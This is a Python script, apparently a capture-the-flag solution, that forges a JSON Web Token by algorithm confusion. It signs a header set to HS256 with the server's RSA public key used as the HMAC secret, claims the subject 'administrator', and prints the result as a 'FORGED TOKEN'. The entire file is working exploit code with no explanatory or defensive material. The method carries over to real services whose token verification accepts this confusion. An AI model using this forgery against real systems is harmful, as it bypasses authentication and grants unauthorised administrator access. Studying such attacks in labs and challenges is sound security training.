import hmac
import hashlib
import base64

# 1. The Exact Public Key you provided (Acting as the "Secret")
# We explicitly add the final newline '\n' because the server reads it from a file.
public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvXeIB/wNgUrWt18GhfL8
sT3y8ulEJOa2FgwKFvEmIZ7q1JfJypcnWDw2vKyAZeLug7j0scEuIxUPoGAN1FVE
uENI8oHDGew/4cl1kfIX9yJe+4eNsYcwkpzQvEpxkYxlMsP5lm6R35q/gJz4XmPI
o3rKjuuGfwrMdBhzrtFxBh8HDmGqfhTymB4+N0PCYj4Pz8nPDZoeJtgxWcvIJuJZ
xHzIkhZR0+HKS9HejcMbNogQsDq5B1JbhzGB+fr9c5XM7DQyXq/UDWSX8z0IhlAZ
0nCFCa4W1ViJZfzPLoX3+jhW/TAHG42Yb/1+FzHGTgPPfUoOU0IIhaPLOeayD9JD
hwIDAQAB
-----END PUBLIC KEY-----
"""

# Helper: Base64URL encode without padding
def b64url(data):
    return base64.urlsafe_b64encode(data.encode('utf-8')).rstrip(b'=')

# 2. Define Header & Payload (Compact JSON, no spaces)
header = '{"alg":"HS256","kid":"neon_root_key"}'
payload = '{"sub":"administrator","iss":"DecoyKeyCTF"}'

# 3. Create the Signing Input
b64_header = b64url(header)
b64_payload = b64url(payload)
signing_input = b64_header + b'.' + b64_payload

# 4. Sign it using HMAC-SHA256
# Crucial: We encode the PEM string to bytes to use as the HMAC secret
signature = hmac.new(
    key=public_key_pem.encode('utf-8'),
    msg=signing_input,
    digestmod=hashlib.sha256
).digest()

b64_signature = base64.urlsafe_b64encode(signature).rstrip(b'=')

# 5. Output the final token
print("--- FORGED TOKEN ---")
print(f"{signing_input.decode('utf-8')}.{b64_signature.decode('utf-8')}")
